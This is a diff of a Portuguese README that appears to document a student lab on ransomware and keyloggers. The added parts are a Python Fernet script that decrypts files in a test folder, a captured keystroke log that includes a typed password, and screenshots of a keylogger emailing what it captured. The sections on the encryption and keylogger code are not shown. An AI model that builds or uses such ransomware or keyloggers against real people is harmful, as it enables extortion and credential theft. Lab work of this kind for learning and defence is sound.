@@ -7,6 +7,42 @@ VSCode
 # Ramsonware
 
 ## Script
+```
+from cryptography.fernet import Fernet
+import os
+
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+def descriptografar_arquivo(arquivo, chave):
+    f = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+        dados_descriptografados = f.decrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)
+
+def encontrar_arquivos(diretorio):
+    lista = []
+    for raiz, _, arquivos in os.walk(diretorio):
+        for nome in arquivos:    
+            caminho = os.path.join(raiz, nome)
+            if nome != "descriptografar.py" and not nome.endswith(".key"):
+                lista.append(caminho)
+    return lista
+
+def main():
+    chave = carregar_chave()
+    arquivos = encontrar_arquivos("test_files")
+    for arquivo in arquivos:
+        descriptografar_arquivo(arquivo, chave)
+    print("Arquivos restaurados com sucesso!")
+
+if __name__=="__main__":
+    main()
+
+```
+
 ## Arquivos gerados
 ## Resultado
 
@@ -58,6 +94,24 @@ with keyboard.Listener(on_press=on_press) as listener:
 
 
 ## Arquivos gerados
+
+Log.txt
+
+```
+allan
+dsdfplkçskfs
+dffdsd
+ teste de li  logger
+[ESC]c   fuetc  ltech 470
+c
+
+Capturando o a vitima digantea  a ando os carectores no tecledo   ado
+123 senha
+pegou
+```
+
+
+
 ## Resultado
 
 # keylogger com envio automatico
@@ -126,7 +180,13 @@ with keyboard.Listener(on_press=on_press) as listener:
 ```
 
 ## Arquivos gerados
+
+<img width="951" height="282" alt="keylogger_email" src="https://github.com/user-attachments/assets/10d12215-855c-4b6c-97aa-0f9063c8b541" />
+
 ## Resultado
+
+<img width="1153" height="419" alt="GmailKeyLogger" src="https://github.com/user-attachments/assets/7f8a7cd8-a3b3-403f-971b-75a0ba585447" />
+
 
 # Defesa 
 
